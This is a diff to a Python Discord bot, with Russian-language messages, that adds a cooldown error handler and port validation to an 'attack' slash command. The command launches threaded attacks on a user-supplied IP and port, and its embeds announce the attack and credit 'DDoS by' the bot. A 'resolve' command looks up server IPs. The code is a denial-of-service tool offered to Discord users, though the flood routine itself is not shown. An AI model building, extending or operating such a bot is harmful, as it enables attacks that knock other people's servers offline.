@@ -27,6 +27,18 @@ async def on_ready():
         await asyncio.sleep(10.0)
         await bot.change_presence(activity=discord.Game(name="/credits - инфа!"))
 
+@bot.event
+async def on_application_command_error(ctx, error):
+    if isinstance(error, commands.CommandOnCooldown):
+        error = discord.Embed(
+            title="Ошибка",
+            description=f"Эта команда на задержке. Ты сможешь её использовать через {round(error.retry_after, 2)} секунд.",
+            color = discord.Colour.red()
+        )
+        await ctx.respond(embed=error)
+    else:
+        raise error
+
 
 @bot.slash_command(guild_ids = testingservers, name = "credits", description = "Информация о создателе!")
 @commands.cooldown(1, 60, commands.BucketType.user)
@@ -66,7 +78,15 @@ async def attack(ctx, ip):
        thread = threading.Thread(target=attack_server, args=(ip,))
        thread.setDaemon(True)
        thread.start()
-    attack_start()
+    if ":" in ip:
+        pass
+    else:
+        error = discord.Embed(
+            title="Ошибка",
+            description="Не указан порт сервера",
+            color = discord.Colour.red()
+        )
+        return await ctx.respond(embed=error)
     embed = discord.Embed(
         title='Начала атаки...',
         description=f'Атака от {ctx.author.mention}',
@@ -75,6 +95,7 @@ async def attack(ctx, ip):
     embed.add_field(name='Айпи сервера:', value="{}".format(ip), inline=False)
     embed.set_image(url=config.ATTACK_GIF)
     embed.set_footer(text="DDoS by " + botname)
+    attack_start()
     await ctx.respond(embed=embed)
 
 @bot.slash_command(guild_ids = testingservers, name = "resolve", description = "Узнать айпи сервера!")
